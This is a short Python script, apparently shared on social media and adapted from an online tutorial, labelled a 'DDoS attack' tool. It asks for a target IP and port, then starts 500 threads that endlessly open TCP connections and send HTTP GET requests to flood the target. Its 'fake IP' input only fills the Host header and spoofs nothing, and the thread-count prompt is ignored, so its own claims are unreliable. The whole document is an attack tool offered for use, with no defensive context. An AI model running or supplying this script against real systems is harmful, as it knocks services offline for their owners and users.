#!/usr/local/bin/python3
# Made by @swisscoding on Instagram

from colored import stylize, fg
import socket, threading

"""
source: https://www.neuralnine.com/code-a-ddos-script-in-python/
"""

# decoration
print(stylize("\n---- | DDos attack | ----\n", fg("red")))

# user interaction
target = input("IP address of target: ")
fake_ip = input("Fake IP address: ")
port = int(input("Port: "))
threads = int(input("Amount of threads: "))

# function
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

# main loop
print(stylize("\nDDoS started...\n", fg("red")))
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
